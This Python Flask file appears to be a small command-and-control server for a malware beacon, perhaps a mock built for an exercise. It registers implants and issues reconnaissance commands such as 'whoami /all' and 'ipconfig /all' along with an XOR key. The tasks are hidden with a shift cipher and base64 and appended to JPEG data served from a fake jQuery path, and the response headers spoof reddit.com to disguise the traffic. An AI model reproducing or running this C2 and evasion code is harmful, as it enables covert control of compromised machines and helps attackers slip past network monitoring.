from dataclasses import dataclass
from flask import request, Flask
import base64


def shift(data, amt):
    return "".join([chr(ord(c) + amt) for c in data])


@dataclass
class Registration:
    hostname: str
    ip: str
    arch: str


REGISTER = "/register"
LOGIN = "/login"
CHECK_IN = "/media"
CHECK_IN_2 = "/jquery-3.3.1.slim.min.js"
SHIFT = 9
FAKE_ROUTINE = {
    1: "whoami",
    2: "ls",
    3: "whoami /all",
    4: "ipconfig /all",
    5: "profile |/jquery-3.3.1.slim.min.js",
    6: "ls",
    7: "XOR |zzmP9zzmP9",
}

HEADERS = {
    "Host": "www.reddit.com",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0)",
    "Referrer": "https://www.reddit.com/r/TheBear/comments/196vbyn/ebon_mossbachrach_wins_best_supporting_actor_in_a/",
    "Nonce": "2IOvxF6Kfx9UnRj+WtZY/g==",
}

ctr = 0

app = Flask(__name__)


@app.route(REGISTER, methods=["POST"])
def register():
    """
    Initial beacon checkin, register the host and send back a shift value
    """
    return str(SHIFT), 200


@app.route(LOGIN, methods=["POST"])
def login():
    """
    This is where our beacon sends us information about the target host
    """

    enc = request.data
    shifted = base64.b64decode(enc)
    decoded = shift(shifted.decode(), -SHIFT)
    beacon = "sleep | 2"
    shift_beacon = shift(beacon, SHIFT)
    ret = base64.b64encode(shift_beacon.encode())
    return ret, 200


@app.route(CHECK_IN, methods=["GET"])
def check_in():
    global ctr
    ctr += 1
    if ctr in FAKE_ROUTINE:
        enc = shift(FAKE_ROUTINE[ctr], SHIFT)
        enc_routine = base64.b64encode(enc.encode())
        with open(f"./profile/{ctr}.jpg", "rb") as f:
            img = f.read()
            return img + b" ||" + enc_routine


@app.route(CHECK_IN_2, methods=["GET"])
def check_in_2():
    global ctr
    ctr += 1
    url = request.args.get("url")

    if ctr in FAKE_ROUTINE:
        enc = shift(FAKE_ROUTINE[ctr], SHIFT)
        enc_routine = base64.b64encode(enc.encode())
        with open(f"./profile/{ctr}.jpg", "rb") as f:
            img = f.read()
            return img + b" ||" + enc_routine

    oob = shift("oob", SHIFT)
    return base64.b64encode(oob.encode())


@app.after_request
def add_headers(response):
    response.headers["Host"] = HEADERS["Host"]
    response.headers["User-Agent"] = HEADERS["User-Agent"]
    response.headers["Referrer"] = HEADERS["Referrer"]
    response.headers["Nonce"] = HEADERS["Nonce"]

    return response


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80, debug=True)
